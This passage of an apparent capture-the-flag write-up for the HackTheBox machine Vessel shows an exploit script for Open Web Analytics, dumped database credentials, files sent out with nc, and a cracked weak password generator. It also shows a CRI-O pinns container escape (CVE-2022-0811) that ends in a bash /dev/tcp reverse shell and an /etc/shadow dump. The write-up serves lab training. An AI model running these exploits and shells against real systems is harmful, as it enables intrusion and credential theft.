    print("  / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ \| || |  / /_|___ /___  |")
    print(" | |    \ \ / /|  _| _____ __) | | | |__) | __) |____ __) | || |_| '_ \ |_ \  / / ")
    print(" | |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/|__   _| (_) |__) |/ /  ")
    print("  \____|  \_/  |_____|   |_____|\___/_____|_____|   |_____|  |_|  \___/____//_/   ")
    print("\t\t\t\t\t\t\tby 0xPThree - exploit.se\n\n")
                                                                                  

def main():
    formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=70)
    parser = argparse.ArgumentParser(formatter_class=formatter)
    parser.add_argument('-t','--target', type=str, help='target url')
    parser.add_argument('-u','--username', type=str, help='owa username')
    parser.add_argument('-p','--password', type=str, help='owa password')
    args = parser.parse_args()

    printArt()
    print(Fore.CYAN + "[>] PART 1: SINGLE / DOUBLE QUOTE CONFUSION")
    owaLogin(args.target, args.username, args.password)             # create cache file
    temp_passkey = getTempPassKey(args.target)                      # extract temp_passkey
    changePw(args.target, temp_passkey, args.password)              # change user password
    owaLogin(args.target, args.username, args.password)             # login as user

    print(Fore.CYAN + "\n[>] PART 2: PHP FILE WRITE")
    log_dir = updateLog(args.target)                                # update log settings
    getReverse(args.target, log_dir)                                # trigger reverse shell     
    
    
if __name__ == "__main__":
    main()
```

**NOTE:** The script won't take into account if the php cache file already exists, if that's the case it will print _"admin login successful"_ at the start even though it isnt. I'm to lazy to fix this, even though it's solved with a simple if-statement.

![[/assets/images/htb-writeup-vessel/vessel09.png]]

### Step 5
Enumerate the box manually and we find..

.. **mysql** credentials and data:
```bash
www-data@vessel:/$ cat /var/www/html/owa/owa-config.php
[... snip ...]
define('OWA_DB_TYPE', 'mysql'); // options: mysql
define('OWA_DB_NAME', 'owa'); // name of the database
define('OWA_DB_HOST', 'localhost'); // host name of the server housing the database
define('OWA_DB_USER', 'owauser'); // database user
define('OWA_DB_PORT', '3306'); // port of database
define('OWA_DB_PASSWORD', 'Vux8*ZF3rek94%NW'); // database users password


www-data@vessel:/var/www/html/vessel/vessel/config$ cat db.js
var connection = {
	db: {
	host     : 'localhost',
	user     : 'default',
	password : 'daqvACHKvRn84VdVp',
	database : 'vessel'
	

www-data@vessel:/var/www/html/owa/owa-data/logs$ netstat -tulpn
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name            
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -       


www-data@vessel:/var/www/html/owa/owa-data/logs$ mysql owa -u owauser -p
Enter password: Vux8*ZF3rek94%NW
mysql> use owa;
mysql> select * from owa_user;
+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+
| id | user_id | password                                                     | role  | real_name     | email_address    | temp_passkey                     | creation_date | last_update_date | api_key                          |
+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+
|  1 | admin   | $2y$10$40VVeZjtIFp7QY9FByW.y.wkTFkcEcOEmEPjpVbGbdxMIUbfKzc96 | admin | default admin | admin@vessel.htb | a48f104f6f995e9655fe771a039666ad |    1650211659 |       1650211659 | a390cc0247ecada9a2b8d2338b9ca6d2 |
+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+


www-data@vessel:/var/www/html/owa/owa-data/logs$ mysql -D vessel -u default -p
Enter password: daqvACHKvRn84VdVp
mysql> use vessel;
mysql> select * from accounts;
+----+----------+----------------------------------+------------------+
| id | username | password                         | email            |
+----+----------+----------------------------------+------------------+
|  1 | admin    | k>N4Hf6TmHE(W]Uq"(RCj}V>&=rB$4}< | admin@vessel.htb |
+----+----------+----------------------------------+------------------+
```

.. read/execute privileges in user `steven`'s home directory:
```bash
www-data@vessel:/home$ ls -al
ls -al
total 16
drwxr-xr-x  4 root   root   4096 Aug 11 14:43 .
drwxr-xr-x 19 root   root   4096 Aug 11 14:43 ..
drwx------  5 ethan  ethan  4096 Aug 11 14:43 ethan
drwxrwxr-x  3 steven steven 4096 Aug 11 14:43 steven

www-data@vessel:/home$ ls -al steven	
total 33796
drwxrwxr-x 3 steven steven     4096 Aug 11 14:43 .
drwxr-xr-x 4 root   root       4096 Aug 11 14:43 ..
lrwxrwxrwx 1 root   root          9 Apr 18 14:45 .bash_history -> /dev/null
-rw------- 1 steven steven      220 Apr 17 18:38 .bash_logout
-rw------- 1 steven steven     3771 Apr 17 18:38 .bashrc
drwxr-xr-x 2 ethan  steven     4096 Aug 11 14:43 .notes
-rw------- 1 steven steven      807 Apr 17 18:38 .profile
-rw-r--r-- 1 ethan  steven 34578147 May  4 11:03 passwordGenerator

www-data@vessel:/home/steven$ file passwordGenerator
passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows
```

.. two files in the `.notes` directory. Download and analyze them:
```bash
www-data@vessel:/home/steven/.notes$ ls -al
ls -al
total 40
drwxr-xr-x 2 ethan  steven  4096 Aug 11 14:43 .
drwxrwxr-x 3 steven steven  4096 Aug 11 14:43 ..
-rw-r--r-- 1 ethan  steven 17567 Aug 10 18:42 notes.pdf
-rw-r--r-- 1 ethan  steven 11864 May  2 21:36 screenshot.png
www-data@vessel:/home/steven/.notes$ nc -w3 10.10.14.2 1234 < notes.pdf
nc -w3 10.10.14.2 1234 < notes.pdf
www-data@vessel:/home/steven/.notes$ nc -w3 10.10.14.2 1234 < screenshot.png
nc -w3 10.10.14.2 1234 < screenshot.png
```

_screenshot.png:_
![[/assets/images/htb-writeup-vessel/vessel10.png]]

_notes.pdf:_
![[/assets/images/htb-writeup-vessel/vessel11.png]]

None of the three found passwords unlocks the file, and we are unable to crack the PDF using `pdf2john` and `john`.
```bash
➜  vessel cat password.txt 
Vux8*ZF3rek94%NW
daqvACHKvRn84VdVp
k>N4Hf6TmHE(W]Uq"(RCj}V>&=rB$4}<
```

Nor does any of the passwords work to escalate privileges using `su` and/or `ssh`. With _screenshot.png_ pointing towards the `passwordGenerator` we probably need to dig deeper here, maybe calculated passwords are stored within, passwords are generated in the same order or they are generated with a constant value making the seeming "random" password only having x amount of possible iteration. 

Looking on the file with `strings` we can see that it was compiled using `PyInstaller`:
```bash
➜  vessel strings passwordGenerator| grep -i pyins
Cannot open PyInstaller archive from executable (%s) or external archive (%s)
PyInstaller: FormatMessageW failed.
PyInstaller: pyi_win32_utils_to_utf8 failed.
```

_"PyInstaller reads a Python script written by you. It analyzes your code to discover every other module and library your script needs in order to execute. Then it collects copies of all those files -- including the active Python interpreter! -- and puts them with your script in a single folder, or optionally in a single executable file."_

Luckily for us, these files can be extracted using [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor). Download pyinstxtractor to your Windows VM and extract the files from `passwordGenerator`. 

```poweshell
PS C:\tools\pyinstxtractor> python .\pyinstxtractor.py C:\Users\pwn10\Documents\htb\vessel\passwordGenerator
[+] Processing C:\Users\pwn10\Documents\htb\vessel\passwordGenerator
[+] Pyinstaller version: 2.1+
[+] Python version: 3.7
[+] Length of package: 34300131 bytes
[+] Found 95 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pyside2.pyc
[+] Possible entry point: passwordGenerator.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: C:\Users\pwn10\Documents\htb\vessel\passwordGenerator

You can now use a python decompiler on the pyc files within the extracted directory
```

Notice the python version 3.7, I'm running 3.10 making the output not accurate. Download and install python 3.7 and try again.
```bash
PS C:\tools\pyinstxtractor> python3.7.exe pyinstxtractor.py C:\Users\pwn10\Documents\htb\vessel\passwordGenerator       [+] Processing C:\Users\pwn10\Documents\htb\vessel\passwordGenerator
[+] Pyinstaller version: 2.1+
[+] Python version: 3.7
[+] Length of package: 34300131 bytes
[+] Found 95 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pyside2.pyc
[+] Possible entry point: passwordGenerator.pyc
[+] Found 142 files in PYZ archive
[+] Successfully extracted pyinstaller archive: C:\Users\pwn10\Documents\htb\vessel\passwordGenerator

You can now use a python decompiler on the pyc files within the extracted directory
```

As stated on pyinstxtractor's git, we now need to decompile the ``.pyc`` files, something we can do using `uncompyle6` or `decompyle3`.
```python
PS C:\> pip3 install uncompyle6
Collecting uncompyle6
  Using cached uncompyle6-3.8.0-py310-none-any.whl (317 kB)
Requirement already satisfied: spark-parser<1.9.0,>=1.8.9 in c:\python310\lib\site-packages (from uncompyle6) (1.8.9)
Requirement already satisfied: xdis<6.1.0,>=6.0.2 in c:\python310\lib\site-packages (from uncompyle6) (6.0.4)
Requirement already satisfied: click in c:\python310\lib\site-packages (from spark-parser<1.9.0,>=1.8.9->uncompyle6) (8.1.3)
Requirement already satisfied: six>=1.10.0 in c:\python310\lib\site-packages (from xdis<6.1.0,>=6.0.2->uncompyle6) (1.16.0)
Requirement already satisfied: colorama in c:\python310\lib\site-packages (from click->spark-parser<1.9.0,>=1.8.9->uncompyle6) (0.4.5)
Installing collected packages: uncompyle6
Successfully installed uncompyle6-3.8.0

PS C:\tools\pyinstxtractor\passwordGenerator_extracted> uncompyle6 passwordGenerator.pyc > passwordGenerator.py
PS C:\tools\pyinstxtractor\passwordGenerator_extracted> cat passwordGenerator.py
# uncompyle6 version 3.8.0
# Python bytecode 3.7.0 (3394)
# Decompiled from: Python 3.10.1 (tags/v3.10.1:2cd268a, Dec  6 2021, 19:10:37) [MSC v.1929 64 bit (AMD64)]
# Embedded file name: passwordGenerator.py
from PySide2.QtCore import *
from PySide2.QtGui import *
from PySide2.QtWidgets import *
from PySide2 import QtWidgets
import pyperclip

class Ui_MainWindow(object):

    def setupUi(self, MainWindow):
        if not MainWindow.objectName():
            MainWindow.setObjectName('MainWindow')
        MainWindow.resize(560, 408)
        self.centralwidget = QWidget(MainWindow)
        self.centralwidget.setObjectName('centralwidget')
        self.title = QTextBrowser(self.centralwidget)
        self.title.setObjectName('title')
        self.title.setGeometry(QRect(80, 10, 411, 51))
        self.textBrowser_2 = QTextBrowser(self.centralwidget)
        self.textBrowser_2.setObjectName('textBrowser_2')
        self.textBrowser_2.setGeometry(QRect(10, 80, 161, 41))
        self.generate = QPushButton(self.centralwidget)
        self.generate.setObjectName('generate')
        self.generate.setGeometry(QRect(140, 330, 261, 51))
        self.PasswordLength = QSpinBox(self.centralwidget)
        self.PasswordLength.setObjectName('PasswordLength')
        self.PasswordLength.setGeometry(QRect(30, 130, 101, 21))
        self.PasswordLength.setMinimum(10)
        self.PasswordLength.setMaximum(40)
        self.copyButton = QPushButton(self.centralwidget)
        self.copyButton.setObjectName('copyButton')
        self.copyButton.setGeometry(QRect(460, 260, 71, 61))
        self.textBrowser_4 = QTextBrowser(self.centralwidget)
        self.textBrowser_4.setObjectName('textBrowser_4')
        self.textBrowser_4.setGeometry(QRect(190, 170, 141, 41))
        self.checkBox = QCheckBox(self.centralwidget)
        self.checkBox.setObjectName('checkBox')
        self.checkBox.setGeometry(QRect(250, 220, 16, 17))
        self.checkBox.setCheckable(True)
        self.checkBox.setChecked(False)
        self.checkBox.setTristate(False)
        self.comboBox = QComboBox(self.centralwidget)
        self.comboBox.addItem('')
        self.comboBox.addItem('')
        self.comboBox.addItem('')
        self.comboBox.setObjectName('comboBox')
        self.comboBox.setGeometry(QRect(350, 130, 161, 21))
        self.textBrowser_5 = QTextBrowser(self.centralwidget)
        self.textBrowser_5.setObjectName('textBrowser_5')
        self.textBrowser_5.setGeometry(QRect(360, 80, 131, 41))
        self.password_field = QLineEdit(self.centralwidget)
        self.password_field.setObjectName('password_field')
        self.password_field.setGeometry(QRect(100, 260, 351, 61))
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QStatusBar(MainWindow)
        self.statusbar.setObjectName('statusbar')
        MainWindow.setStatusBar(self.statusbar)
        self.retranslateUi(MainWindow)
        QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(QCoreApplication.translate('MainWindow', 'MainWindow', None))
        self.title.setDocumentTitle('')
        self.title.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:20pt;">Secure Password Generator</span></p></body></html>', None))
        self.textBrowser_2.setDocumentTitle('')
        self.textBrowser_2.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:14pt;">Password Length</span></p></body></html>', None))
        self.generate.setText(QCoreApplication.translate('MainWindow', 'Generate!', None))
        self.copyButton.setText(QCoreApplication.translate('MainWindow', 'Copy', None))
        self.textBrowser_4.setDocumentTitle('')
        self.textBrowser_4.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:14pt;">Hide Password</span></p></body></html>', None))
        self.checkBox.setText('')
        self.comboBox.setItemText(0, QCoreApplication.translate('MainWindow', 'All Characters', None))
        self.comboBox.setItemText(1, QCoreApplication.translate('MainWindow', 'Alphabetic', None))
        self.comboBox.setItemText(2, QCoreApplication.translate('MainWindow', 'Alphanumeric', None))
        self.textBrowser_5.setDocumentTitle('')
        self.textBrowser_5.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:16pt;">characters</span></p></body></html>', None))
        self.password_field.setText('')


class MainWindow(QMainWindow, Ui_MainWindow):

    def __init__(self):
        super(MainWindow, self).__init__()
        self.setupUi(self)
        self.setFixedSize(QSize(550, 400))
        self.setWindowTitle('Secure Password Generator')
        self.password_field.setReadOnly(True)
        self.passlen()
        self.chars()
        self.hide()
        self.gen()

    def passlen(self):
        self.PasswordLength.valueChanged.connect(self.lenpass)

    def lenpass(self, l):
        global value
        value = l

    def chars(self):
        self.comboBox.currentIndexChanged.connect(self.charss)

    def charss(self, i):
        global index
        index = i

    def hide(self):
        self.checkBox.stateChanged.connect(self.status)

    def status(self, s):
        global status
        status = s == Qt.Checked

    def copy(self):
        self.copyButton.clicked.connect(self.copied)

    def copied(self):
        pyperclip.copy(self.password_field.text())

    def gen(self):
        self.generate.clicked.connect(self.genButton)

    def genButton(self):
        try:
            hide = status
            if hide:
                self.password_field.setEchoMode(QLineEdit.Password)
            else:
                self.password_field.setEchoMode(QLineEdit.Normal)
            password = self.genPassword()
            self.password_field.setText(password)
        except:
            msg = QMessageBox()
            msg.setWindowTitle('Warning')
            msg.setText('Change the default values before generating passwords!')
            x = msg.exec_()

        self.copy()

    def genPassword(self):
        length = value
        char = index
        if char == 0:
            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
        else:
            if char == 1:
                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
            else:
                if char == 2:
                    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
                else:
                    try:
                        qsrand(QTime.currentTime().msec())
                        password = ''
                        for i in range(length):
                            idx = qrand() % len(charset)
                            nchar = charset[idx]
                            password += str(nchar)

                    except:
                        msg = QMessageBox()
                        msg.setWindowTitle('Error')
                        msg.setText('Error while generating password!, Send a message to the Author!')
                        x = msg.exec_()

                return password


if __name__ == '__main__':
    app = QtWidgets.QApplication()
    mainwindow = MainWindow()
    mainwindow.show()
    app.exec_()
# okay decompiling passwordGenerator.pyc
```


### Step 6
At the bottom of the script we see the function we're after, `genPassword`, where they use a simple for-loop and a time-based randomizer for generating passwords:
```python
 qsrand(QTime.currentTime().msec())
 password = ''
 for i in range(length):
    idx = qrand() % len(charset)
    nchar = charset[idx]
    password += str(nchar)
```

We can simply copy the `genPassword` function, remove all trash as we saw from _screenshot.png_ that the length should be 32 and charset 0 (all characters) is used.

I was stuck with this script for a few hours, mainly because the product always generate 999 passwords. Debugging with `print()` and writing output to file I found that the value produced from `qrand()` isn't that random at all and re-appear several times, even in the same pattern. Since the seed change every loop, my script would only generate 1 password per seed. Looking on the [docs](https://doc.qt.io/qtforpython-5/PySide2/QtCore/QTime.html#PySide2.QtCore.PySide2.QtCore.QTime.msec) for `QTime.msec()` we find `msec()` will return 0 - 999, giving us a maximum of 1000 passwords generated.

**PoC to show qtime() "random" numbers:**
```bash
➜  vessel ./genPw.py | tee output.txt 
[... snip ...]
loop nr. 88434 - generated passwords: 999
qrand: 31376150
loop nr. 88435 - generated passwords: 999
qrand: 31376150
loop nr. 88436 - generated passwords: 999
qrand: 31424421
loop nr. 88437 - generated passwords: 999
qrand: 31424421

➜  vessel grep -n 31376150 output.txt
59669:qrand: 31376150
176871:qrand: 31376150

➜  vessel grep -n 31424421 output.txt
59671:qrand: 31424421
176873:qrand: 31424421
```

We could also verify this a bit easier by just writing `QTime.currentTime().msec()` to a variable and printing the variable. 

Write a script to loop through 0 - 999 and generate a password based on the "loop number" to generate all possible passwords. Most of the code can just be taken from the original program.

```bash
➜  vessel python3 genPws.py
[... snip ...]
loop nr. 998 - generated passwords: 997
loop nr. 999 - generated passwords: 998
time elapsed: 0.02527642250061035 seconds

➜  vessel wc -l pw-list.txt 
999 pw-list.txt

➜  vessel john --wordlist=pw-list.txt notes.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 3 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2022-09-01 18:53) 0g/s 99900p/s 99900c/s 99900C/s 2J16^>.|vtXpN2[o1H;e4f|FF0([y+|q..l2DoG^icl}>kZ[tNB|:]m5km@{x:^7ck
Session completed. 

➜  vessel john --show notes.hash
0 password hashes cracked, 1 left
```

Although everything is correct in theory, we're not able to generate correct password.. this had me stumped for even more hours where I re-built the script a few times but without any luck. Then I decided to try the script on my Windows VM. 

```powershell
PS C:\Users\void\Documents\htb\vessel> python3.7.exe .\genPws.py
[... snip ...]
loop nr. 998 - generated passwords: 998
loop nr. 999 - generated passwords: 999
time elapsed: 0.14032745361328125 seconds
```

Transfer the password file to Kali attack VM and BOOM! We're able to crack the PDF.
The problem is coming from `PySide2` behaving differently depending on OS. Don't ask me how, or why, this I simply don't know. 

```bash
➜  vessel john --wordlist=pw-list_windows.txt notes.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 3 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS (notes.pdf)     
1g 0:00:00:00 DONE (2022-09-01 19:01) 100.0g/s 38400p/s 38400c/s 38400C/s _jEkA+f0VXtWZ[K.d+EdaBAB>;r]E3Z*..r6TUgox@Tb5JWnK5AHO}$AE%8!d58Shq
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed. 

➜  vessel john --show notes.hash                        
notes.pdf:YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS

1 password hash cracked, 0 left
```

**Full script:**
```python
#!/usr/bin/env python3
from PySide2.QtCore import *
import time

def genPassword(i):
    length = 32
    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
    try:
        qsrand(i)
        password = ''
        for i in range(length):
            idx = qrand() % len(charset)
            nchar = charset[idx]
            password += str(nchar)
    except:
        print("Something went wrong..")
    return(password)


def main():
    start = time.time()
    storage = []
    i = 1
    try: 
        with open("pw-list.txt", "w") as a_file:
            for i in range(1000):
            #while len(storage) < 1000:
                passwd = genPassword(i)
                print("loop nr.", i, "- generated passwords:", len(storage))
                i = i + 1
                
                if passwd not in storage:
                    storage.append(passwd)
                    a_file.write(passwd + '\n')

    except KeyboardInterrupt:
        print("Stopping..")
    end = time.time()
    print("time elapsed:", end - start, "seconds")


if __name__ == "__main__":
    main()
```


### Step 7
Read the PDF and we find System Administrator `ethan`'s password - `b@mPRNSVTjjLKId1T`

![[/assets/images/htb-writeup-vessel/vessel12.png]]

Login with SSH and grab `user.txt`
```bash
➜  vessel ssh ethan@vessel.htb 
ethan@vessel.htb password: b@mPRNSVTjjLKId1T

ethan@vessel:~$ id && hostname && cat user.txt 
uid=1000(ethan) gid=1000(ethan) groups=1000(ethan)
vessel
608191af90716a518c1483138b0b1ded
```

-------------------

# ROOT
### Step 1
Some quick manual enumeration as user `ethan` and we find..

.. we're unable to run anything as `root`:
```bash
ethan@vessel:~$ sudo -l
[sudo] password for ethan: 
Sorry, user ethan may not run sudo on vessel.
```

.. nothing of use in `/opt`, `/tmp` or `/dev/shm`

.. no unknown service running locally:
```bash
ethan@vessel:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -   
```

.. we are not part of any strange/interesting groups:
```bash
ethan@vessel:~$ id
uid=1000(ethan) gid=1000(ethan) groups=1000(ethan)
```

.. interesting objects owned by group `ethan`:
```bash
ethan@vessel:/$ find / -group ethan 2> /dev/null
/usr/bin/pinns

ethan@vessel:/$ ls -al /usr/bin/pinns
-rwsr-x--- 1 root ethan 814936 Mar 15 18:18 /usr/bin/pinns
```

`/usr/bin/pinns` have the SUID bit set and is most likely our path to root, lets investigate more. 
```bash
ethan@vessel:/$ /usr/bin/pinns
[pinns:e]: Path for pinning namespaces not specified: Invalid argument
ethan@vessel:/$ /usr/bin/pinns --help
ethan@vessel:/$ /usr/bin/pinns -h
```

Googling for _"Path for pinning namespaces"_ we get two matches, both referencing **CRI-O**.
![[/assets/images/htb-writeup-vessel/vessel13.png]]
_"CRI-O is **an implementation of the Kubernetes CRI (Container Runtime Interface) to enable using OCI (Open Container Initiative) compatible runtimes**. It is a lightweight alternative to using Docker as the runtime for kubernetes."_

Google _cri-o "pinns"_ and the first article we find is one from CrowdStrike disclosing a vulnerability in CRI-O, [CVE-2022-0811](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/). 
Some key information from the article:
- _"Dubbed “cr8escape,” when invoked, an attacker could escape from a Kubernetes container and gain root access to the host and be able to move anywhere in the cluster."_
- _".. discovered a flaw introduced in CRI-O version [1.19](https://github.com/cri-o/cri-o/tree/v1.19.0/pinns/src) that allows an attacker to bypass these safeguards and set arbitrary kernel parameters on the host."_
- _".. anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime can abuse the “[kernel.core_pattern](https://man7.org/linux/man-pages/man5/core.5.html)” parameter to achieve container escape and arbitrary code execution as root on any node in the cluster."_
* A PoC on how to exploit this vulnerability with ``kubectl``

```bash
ethan@vessel:/$ crio --version
crio version 1.19.6
Version:       1.19.6
GitCommit:     c12bb210e9888cf6160134c7e636ee952c45c05a
GitTreeState:  clean
BuildDate:     2022-03-15T18:18:24Z
GoVersion:     go1.15.2
Compiler:      gc
Platform:      linux/amd64
Linkmode:      dynamic
```

We've most definitely found the start towards root.


### Step 2
Reading about the exploit we should (1) create a pod/container, (2) use ``pinns`` to exploit the vulnerable variable `kernel.core_pattern`, (3) trigger a core dump and then reap the rewards

This is all easy in theory, but we don't have `kubectl`, `minikube` or `docker` available. However we do have `runc`! 
**(1)** Follow the steps on [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation) to create a container.

```bash
## Create location for runc filesystem
ethan@vessel:/$ mkdir /tmp/pthree
ethan@vessel:/$ mkdir /tmp/pthree/rootfs

## Create runc configuration
ethan@vessel:/tmp/pthree$ runc spec

## Add following data under 'mounts' section of config.json
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

## Start runc
ethan@vessel:/tmp/pthree$ runc run privesc
ERRO[0000] runc run failed: rootless container requires user namespaces
```

Reading about this I find a [GitHub Issue](https://github.com/opencontainers/runc/issues/1782) stating that generating the default spec using `run spec --rootless` will solve the problem, so remove everything and try again.
```bash
ethan@vessel:/tmp/pthree$ rm -rf *
ethan@vessel:/tmp/pthree$ runc spec --rootless
ethan@vessel:/tmp/pthree$ mkdir rootfs
ethan@vessel:/tmp/pthree$ vim config.json 
ethan@vessel:/tmp/pthree$ runc run privesc
# hostname
runc
```

Great, we got a container! 
**(2)** Open a second terminal and write a simple PoC script to be executed 

```bash
ethan@vessel:/tmp$ cat poc 
#!/bin/sh
whoami >> /tmp/out
hostname >> /tmp/out
```

From the second terminal run the malicious `pinns` command, I found this great [Chinese post](https://www.wangan.com/p/7fy7f3b1e4c81b1f) showcasing this.
```bash
ethan@vessel:/tmp$ /usr/bin/pinns -d /tmp/pthree -f privesc -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/poc #'--ipc --net --uts
```

We can verify that `netns` and `utsns` are created in `/tmp/pthree` from the container:
```bash
# ls -al /tmp/pthree
total 24
drwxrwxr-x  5 root   root    4096 Sep  2 09:07 .
drwxrwxrwt 17 nobody nogroup 4096 Sep  2 09:03 ..
-rw-rw-r--  1 root   root    2893 Sep  2 08:59 config.json
drwxr-xr-x  2 nobody root    4096 Sep  2 09:07 netns
drwxrwxr-x  2 root   root    4096 Sep  2 08:58 rootfs
drwxr-xr-x  2 nobody root    4096 Sep  2 09:07 utsns
```

**(3)** In the first terminal (runc container) trigger a core dump to run the script. 
```bash
root@runc:/# ulimit -c unlimited
root@runc:/# tail -f /dev/null &
[1] 32
root@runc:/# kill -SIGSEGV 32
root@runc:/# ps
    PID TTY          TIME CMD
      1 pts/0    00:00:00 sh
     18 pts/0    00:00:00 bash
     33 pts/0    00:00:00 ps
[1]+  Segmentation fault      (core dumped) tail -f /dev/null
```

Reap the rewards from the script:
```bash
ethan@vessel:/tmp/pthree$ cat /tmp/out 
root
vessel
```


### Step 3
The PoC works as intended, weaponize to gain a root shell however you like. Myself, I'd like to try the payload posted in the [Chinese post](https://www.wangan.com/p/7fy7f3b1e4c81b1f).

```bash
ethan@vessel:/tmp/pthree$ /usr/bin/pinns -d /tmp/pthree -f privesc1337 -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/bin/bash -c "$@" -- eval /bin/bash -i >& /dev/tcp/10.10.14.16/4488 0>&1 #'--ipc --net --uts

root@runc:/# ulimit -c unlimited
root@runc:/# tail -f /dev/null &
[1] 34
root@runc:/# kill -SIGSEGV 34

➜  vessel nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.178] 49816
root@vessel:/# id && hostname
uid=0(root) gid=0(root) groups=0(root)
vessel

root@vessel:/# cat /root/root.txt
86dad527504c8042c21914394acb7115

root@vessel:/# cat /etc/shadow
root:$6$9AU197eAAajcv6DO$YOGX5f111bLxtIqVgPKGg3QmWiWIRVmYk3Gkj0BwFVb9K0BkAnJEHaRJElahiQGxtDnvjPI9XqPMkI7YrE60A1:19101:0:99999:7:::
